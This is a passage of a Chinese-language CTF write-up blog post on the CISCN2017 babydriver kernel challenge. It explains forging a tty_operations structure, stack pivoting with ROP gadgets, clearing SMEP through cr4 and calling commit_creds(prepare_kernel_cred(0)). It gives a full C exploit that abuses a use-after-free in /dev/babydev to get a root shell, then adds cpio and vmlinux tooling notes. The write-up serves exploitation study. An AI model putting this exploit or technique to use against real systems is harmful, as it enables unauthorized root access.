class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg);</span><br><span class="line">  <span class="comment">// ......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
+
+
+
+        <h3 id="劫持控制流"   >
+          <a href="#劫持控制流" class="heading-link"><i class="fas fa-link"></i></a><a href="#劫持控制流" class="headerlink" title="劫持控制流"></a>劫持控制流</h3>
+      <p>使用如下代码段，在用户态伪造tty_operations结构体</p>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">size_t</span> tty_operations_fake[<span class="number">30</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;<span class="number">30</span>;j++)&#123;</span><br><span class="line">    tty_operations_fake[j]=<span class="number">0xffffffffc0000130</span>+j;   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
+<p>分别测试对<code>tty_operations-&gt;write()</code>和<code>tty_operations-&gt;ioclt()</code>劫持成功时的上下文情况。</p>
+<ol>
+<li>劫持tty_operations中的write函数，0x7ffe270c1920是用户态伪造的tty_operations结构体地址</li>
+</ol>
+<p><img   src="image-20220806174447004.png?size=600" style="width: 600px;"  alt="image-20220806174447004"></p>
+<ol start="2">
+<li>劫持tty_operations中的ioctl函数，0x7ffe38927460是用户态伪造的tty_operations结构体地址</li>
+</ol>
+<p><img   src="image-20220806174723108.png?size=600" style="width: 600px;"  alt="image-20220806174723108"></p>
+
+        <h3 id="寻找gadget"   >
+          <a href="#寻找gadget" class="heading-link"><i class="fas fa-link"></i></a><a href="#寻找gadget" class="headerlink" title="寻找gadget"></a>寻找gadget</h3>
+      <p>对于内核文件，使用<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/sashs/Ropper" >ropper</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>找可用gadget比ROPgadget的速度要快。</p>
+<ul>
+<li>安装</li>
+</ul>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo pip install capstone</span><br><span class="line">sudo pip install filebytes</span><br><span class="line">sudo pip install keystone-engine</span><br><span class="line">pip install ropper</span><br></pre></td></tr></table></div></figure>
+<ul>
+<li>使用</li>
+</ul>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ropper --file vmlinux --search &quot;mov rsp, rax&quot;</span><br><span class="line">ropper --file vmlinux --search &quot;mov rsp, rcx&quot;</span><br></pre></td></tr></table></div></figure>
+<p>为实现root shell的目的，只执行一条gadget无法达成目的，为此我们需要构造ROP链。但是内核栈空间我们无法控制，因此考虑通过一条gadget先迁移栈到可控的空间，然后继续ROP。</p>
+
+        <h4 id="栈迁移（2次）"   >
+          <a href="#栈迁移（2次）" class="heading-link"><i class="fas fa-link"></i></a><a href="#栈迁移（2次）" class="headerlink" title="栈迁移（2次）"></a>栈迁移（2次）</h4>
+      <blockquote>
+<p>找<code>mov rsp, rax</code> 或者 <code>xchg rax rsp</code> 之类的指令，迁移栈空间</p>
+</blockquote>
+<p>本题使用ropper并未找到合适gadget，最后还是用ROPgadget找到的，如下：</p>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ ROPgadget --binary .&#x2F;vmlinux &gt; ropgadget.txt</span><br><span class="line">$ cat ropgadget.txt | grep &quot;mov rsp,&quot;</span><br><span class="line">······</span><br><span class="line">0xffffffff8181bfc5 : mov rsp, rax ; dec ebx ; jmp 0xffffffff8181bf7e</span><br><span class="line">0xffffffff8181a7ef : mov rsp, rax ; pop rax ; jmp 0xffffffff8181a797</span><br><span class="line">······</span><br></pre></td></tr></table></div></figure>
+<p>上一步劫持控制流中，劫持到tty_operations中的write函数时，RAX中存放了用户态伪造的tty_operations结构体地址。结合<code>0xffffffff8181bfc5</code>这条gadget，可以实现将栈迁移到<code>tty_operations_fake[0]</code>处。</p>
+<p>由于rax指向的地址是tty_operations_fake[0]的首地址，执行几条gadget就会跟<code>tty_operations-&gt;write</code>（tty_operations_fake[7]）重合。因此第一次劫持栈后，再做一次栈迁移，将栈迁移到一个局部数组变量中。</p>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">size_t</span> mov_rsp_rax = <span class="number">0xffffffff8181bfc5</span>; <span class="comment">// mov rsp, rax ; dec ebx ; jmp 0xffffffff8181bf7e</span></span><br><span class="line"><span class="keyword">size_t</span> pop_rax = <span class="number">0xffffffff8100ce6e</span>;     <span class="comment">// pop rax; ret; </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> tty_operations_fake[<span class="number">30</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;<span class="number">30</span>;j++)&#123;</span><br><span class="line">    tty_operations_fake[j]=mov_rsp_rax;   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">tty_operations_fake[<span class="number">0</span>] = pop_rax;					<span class="comment">// 将rax的值改为rop_chain的地址</span></span><br><span class="line">tty_operations_fake[<span class="number">1</span>] = (<span class="keyword">size_t</span>)rop_chain;</span><br><span class="line">tty_operations_fake[<span class="number">2</span>] = mov_rsp_rax;			<span class="comment">//	 第二次站迁移到rop_chain</span></span><br></pre></td></tr></table></div></figure>
+
+
+
+        <h4 id="关闭SMEP"   >
+          <a href="#关闭SMEP" class="heading-link"><i class="fas fa-link"></i></a><a href="#关闭SMEP" class="headerlink" title="关闭SMEP"></a>关闭SMEP</h4>
+      <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://ctf-wiki.org/en/pwn/linux/kernel-mode/exploitation/bypass-smep/#smep" >SMEP - ctfwiki</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p>补充wiki中的描述，当</p>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$CR4 &#x3D; 0x1407f0 &#x3D; 000 1 0100 0000 0111 1111 0000</span><br></pre></td></tr></table></div></figure>
+<p>时，smep 保护开启。而 CR4 寄存器是可以通过 mov 指令修改的，因此只需要</p>
+<figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov cr4, 0x407f0</span><br><span class="line"><span class="meta">#</span><span class="bash"> 0x1407e0 = 000 0 0100 0000 0111 1111 0000</span></span><br></pre></td></tr></table></div></figure>
+<p>CTF比赛中，常将cr4的值设置为0x6f0，来关闭SMEP。</p>
+<p>本题通过ropper找到如下两条gadget，来修改cr4寄存器的值</p>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0xffffffff810d238d: pop rdi; ret;</span><br><span class="line">0xffffffff81004d80: mov cr4, rdi; pop rbp; ret; </span><br></pre></td></tr></table></div></figure>
+
+
+
+        <h4 id="执行提权函数"   >
+          <a href="#执行提权函数" class="heading-link"><i class="fas fa-link"></i></a><a href="#执行提权函数" class="headerlink" title="执行提权函数"></a>执行提权函数</h4>
+      <p>本题未开启KASLR，读取提权所需的内核符号地址如下：</p>
+<figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">/ $ cat /proc/kallsyms &gt; /tmp/kallsyms.txt</span><br><span class="line">/ $ cd tmp</span><br><span class="line">/tmp $ ls</span><br><span class="line">kallsyms.txt</span><br><span class="line">/tmp $ cat kallsyms.txt | grep &quot;prepare_kernel_cred&quot;</span><br><span class="line">ffffffff810a1810 T prepare_kernel_cred</span><br><span class="line">ffffffff81d91890 R __ksymtab_prepare_kernel_cred</span><br><span class="line">ffffffff81dac968 r __kcrctab_prepare_kernel_cred</span><br><span class="line">ffffffff81db9450 r __kstrtab_prepare_kernel_cred</span><br><span class="line">/tmp $ cat kallsyms.txt | grep &quot;commit_creds&quot;</span><br><span class="line">ffffffff810a1420 T commit_creds</span><br><span class="line">ffffffff81d88f60 R __ksymtab_commit_creds</span><br><span class="line">ffffffff81da84d0 r __kcrctab_commit_creds</span><br><span class="line">ffffffff81db948c r __kstrtab_commit_creds</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 函数定义</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> struct cred *prepare_kernel_cred(struct task_struct *);</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> int commit_creds(struct cred *);</span></span><br></pre></td></tr></table></div></figure>
+<p>上一步已关闭SMEP，于是在用户态构造如下代码片段，即可提权</p>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pkc_addr 0xffffffff810a1810</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> cc_addr 0xffffffff810a1420</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_root</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="keyword">char</span>* (*pkc)(<span class="keyword">int</span>) = pkc_addr;</span><br><span class="line">  <span class="keyword">void</span> (*cc)(<span class="keyword">char</span>*) = cc_addr;</span><br><span class="line">  (*cc)((*pkc)(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
+
+
+
+        <h4 id="返回用户态"   >
+          <a href="#返回用户态" class="heading-link"><i class="fas fa-link"></i></a><a href="#返回用户态" class="headerlink" title="返回用户态"></a>返回用户态</h4>
+      <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/435518616" >FS/GS寄存器的用途</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/137277724" >KERNEL PWN状态切换原理及KPTI绕过</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<ul>
+<li><p>swapgs</p>
+<p>一条简单的指令，交换用户态和内核态的GS寄存器。</p>
+</li>
+<li><p>iretq</p>
+<p>会从内核栈中恢复<code>rip/cs/rflags/rsp/ss </code>这几个寄存器，执行iretq指令时，内核栈应按如下格式布局</p>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rsp ---&gt; rip </span><br><span class="line">         cs</span><br><span class="line">         rflags</span><br><span class="line">         rsp</span><br><span class="line">         ss</span><br></pre></td></tr></table></div></figure>
+<p>找到如下gadget</p>
+</li>
+</ul>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0xffffffff81063694: swapgs; pop rbp; ret; </span><br><span class="line">0xffffffff814e35ef: iretq; ret;</span><br></pre></td></tr></table></div></figure>
+
+
+
+        <h4 id="保存现场"   >
+          <a href="#保存现场" class="heading-link"><i class="fas fa-link"></i></a><a href="#保存现场" class="headerlink" title="保存现场"></a>保存现场</h4>
+      <p>为了能稳定返回用户态，在进入内核态前，应保存几个重要寄存器，供iretq时使用。参考代码如下</p>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">size_t</span> user_cs, user_rflags, user_sp, user_ss;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// pushf 标志寄存器入栈</span></span><br><span class="line"><span class="comment">// popf 标志寄存器出栈</span></span><br></pre></td></tr></table></div></figure>
+
+
+
+        <h3 id="完整EXP"   >
+          <a href="#完整EXP" class="heading-link"><i class="fas fa-link"></i></a><a href="#完整EXP" class="headerlink" title="完整EXP"></a>完整EXP</h3>
+      <p>注意，exp需静态编译，且需更改<code>boot.sh</code>，将<code>-enable-kvm</code>参数删除，才能利用该exp打成功。</p>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> pkc_addr = <span class="number">0xffffffff810a1810</span>;</span><br><span class="line"><span class="keyword">size_t</span> cc_addr = <span class="number">0xffffffff810a1420</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_root</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* (*pkc)(<span class="keyword">int</span>) = pkc_addr;</span><br><span class="line">    <span class="keyword">void</span> (*cc)(<span class="keyword">char</span>*) = cc_addr;</span><br><span class="line">    (*cc)((*pkc)(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_rflags, user_sp, user_ss;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov %cs, user_cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov %ss, user_ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov %rsp, user_sp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    save_status();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> mov_rsp_rax = <span class="number">0xffffffff8181bfc5</span>;    <span class="comment">// mov rsp, rax ; dec ebx ; jmp 0xffffffff8181bf7e</span></span><br><span class="line">    <span class="keyword">size_t</span> pop_rax = <span class="number">0xffffffff8100ce6e</span>;        <span class="comment">// pop rax; ret; </span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">size_t</span> rop_chain[<span class="number">30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> index = <span class="number">0</span>;</span><br><span class="line">    rop_chain[index++] = <span class="number">0xffffffff810d238d</span>;        <span class="comment">// pop rdi; ret;</span></span><br><span class="line">    rop_chain[index++] = <span class="number">0x6f0</span>;</span><br><span class="line">    rop_chain[index++] = <span class="number">0xffffffff81004d80</span>;        <span class="comment">// mov cr4, rdi; pop rbp; ret; </span></span><br><span class="line">    rop_chain[index++] = <span class="number">0x0</span>;</span><br><span class="line">    rop_chain[index++] = (<span class="keyword">size_t</span>)get_root;</span><br><span class="line">    rop_chain[index++] = <span class="number">0xffffffff81063694</span>;        <span class="comment">// swapgs; pop rbp; ret; </span></span><br><span class="line">    rop_chain[index++] = <span class="number">0x0</span>;</span><br><span class="line">    rop_chain[index++] = <span class="number">0xffffffff814e35ef</span>;        <span class="comment">// iretq; ret;</span></span><br><span class="line">    rop_chain[index++] = (<span class="keyword">size_t</span>)get_shell;</span><br><span class="line">    rop_chain[index++] = user_cs;</span><br><span class="line">    rop_chain[index++] = user_rflags;</span><br><span class="line">    rop_chain[index++] = user_sp;</span><br><span class="line">    rop_chain[index++] = user_ss;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> tty_operations_fake[<span class="number">30</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;<span class="number">30</span>;j++)&#123;</span><br><span class="line">        tty_operations_fake[j]=mov_rsp_rax;   </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd1 = open(<span class="string">&quot;/dev/babydev&quot;</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">int</span> fd2 = open(<span class="string">&quot;/dev/babydev&quot;</span>,<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    ioctl(fd1,<span class="number">0x10001</span>,<span class="number">0x2e0</span>);</span><br><span class="line">    close(fd1);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd_tty = open(<span class="string">&quot;dev/ptmx&quot;</span>,<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> tty_struct_leak[<span class="number">4</span>];</span><br><span class="line">    read(fd2,tty_struct_leak,<span class="number">32</span>);</span><br><span class="line">    </span><br><span class="line">    tty_operations_fake[<span class="number">0</span>] = pop_rax;</span><br><span class="line">    tty_operations_fake[<span class="number">1</span>] = (<span class="keyword">size_t</span>)rop_chain;</span><br><span class="line">    tty_operations_fake[<span class="number">2</span>] = mov_rsp_rax;</span><br><span class="line"></span><br><span class="line">    tty_struct_leak[<span class="number">3</span>] = (<span class="keyword">size_t</span>)tty_operations_fake;</span><br><span class="line">    write(fd2,tty_struct_leak,<span class="number">32</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> a[<span class="number">4</span>] = &#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>&#125;;</span><br><span class="line">    write(fd_tty,a,<span class="number">32</span>);</span><br><span class="line">    <span class="comment">// ioctl(fd_tty,0x100,32);</span></span><br><span class="line"></span><br><span class="line">    close(fd2);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
+
+
+
+        <h1 id="其他"   >
+          <a href="#其他" class="heading-link"><i class="fas fa-link"></i></a><a href="#其他" class="headerlink" title="其他"></a>其他</h1>
+      
+        <h2 id="cpio解压与压缩"   >
+          <a href="#cpio解压与压缩" class="heading-link"><i class="fas fa-link"></i></a><a href="#cpio解压与压缩" class="headerlink" title="cpio解压与压缩"></a>cpio解压与压缩</h2>
+      <figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 解压</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> gunzip filename.cpio.gz</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> cpio -idmv &lt; filename.cpio</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 压缩</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> find . | cpio -o -H newc &gt; filename.cpio</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 或 find . | cpio -o &gt; filename.cpio</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 或 find . | cpio -o --format=newc &gt; ../rootfs.cpio</span></span><br></pre></td></tr></table></div></figure>
+
+
+
+        <h2 id="将bzImage转化成vmlinux"   >
+          <a href="#将bzImage转化成vmlinux" class="heading-link"><i class="fas fa-link"></i></a><a href="#将bzImage转化成vmlinux" class="headerlink" title="将bzImage转化成vmlinux"></a>将bzImage转化成vmlinux</h2>
+      <p>vmlinux即内核符号文件？</p>
+<figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> /usr/src/linux-headers-$(uname -r)/scripts/extract-vmlinux bzImage &gt; vmlinux</span></span><br></pre></td></tr></table></div></figure>
+<p>vmlinux与bzimage的区别</p>
+<figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> file vmlinux</span> </span><br><span class="line">vmlinux: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, BuildID[sha1]=76517ec1ebecb36ffb324a8b5b0495c51625c53b, stripped</span><br><span class="line"><span class="meta">$</span><span class="bash"> file bzImage</span> </span><br><span class="line">bzImage: Linux kernel x86 boot executable bzImage, version 4.15.8 (root@ubuntu) #3 SMP Thu Jun 3 01:01:56 PDT 2021, RO-rootFS, swap_dev 0x7, Normal VGA</span><br></pre></td></tr></table></div></figure>
+
+
+
+        <h2 id="ko代码段与bss段的地址"   >
+          <a href="#ko代码段与bss段的地址" class="heading-link"><i class="fas fa-link"></i></a><a href="#ko代码段与bss段的地址" class="headerlink" title="ko代码段与bss段的地址"></a>ko代码段与bss段的地址</h2>
+      <blockquote>
+<p>调试内核模块bss段时，要注意实际地址跟IDA分析出来的地址不一样。</p>
+</blockquote>
+<p>babydriver.ko的加载地址是<code>0xffffffffc0000000</code>，text段如<code>babyopen()</code>函数（IDA中显示偏移为0x30）的实际地址为<code>0xffffffffc0000030</code>，而bss段<code>babydev_struct</code>结构体（IDA中显示偏移为0xd90）的实际地址为<code>0xffffffffc00024d0</code>。</p>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;10gx 0xffffffffc0000d90</span><br><span class="line">0xffffffffc0000d90:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0xffffffffc0000da0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0xffffffffc0000db0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0xffffffffc0000dc0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0xffffffffc0000dd0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">pwndbg&gt; x&#x2F;10gx 0xffffffffc00024d0</span><br><span class="line">0xffffffffc00024d0:	0xffff8800027dcb00	0x0000000000000040</span><br><span class="line">0xffffffffc00024e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0xffffffffc00024f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0xffffffffc0002500:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0xffffffffc0002510:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></div></figure>
+
+
+
+</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ 本文结束，感谢您的阅读 ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">本文作者: </span><span class="copyright-author__value"><a href="http://blingblingxuanxuan.github.io">blingbling</a></span></div><div class="copyright-link"><span class="copyright-link__name">本文链接: </span><span class="copyright-link__value"><a href="http://blingblingxuanxuan.github.io/2022/08/28/CISCN2017-babydriver/">http://blingblingxuanxuan.github.io/2022/08/28/CISCN2017-babydriver/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">版权声明: </span><span class="copyright-notice__value">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> 许可协议。转载请注明出处！</span></div></div><div class="post-tags"><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="http://blingblingxuanxuan.github.io/tags/kernel-pwn/">kernel pwn</a></span></div><div class="post-share"><div class="social-share" data-sites="qzone, qq, weibo, wechat, douban, linkedin, facebook, twitter, google">Share to: </div></div><nav class="post-paginator paginator"><div class="paginator-next"><a class="paginator-next__link" href="/2022/07/01/basic-reverse-exercise/"><span class="paginator-prev__text">基础逆向练习题</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">文章目录</span><span class="sidebar-nav-ov">站点概览</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-text">
+          分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-text">
+          利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%B3%951-%E6%94%B9%E5%AD%90%E8%BF%9B%E7%A8%8Bcred"><span class="toc-text">
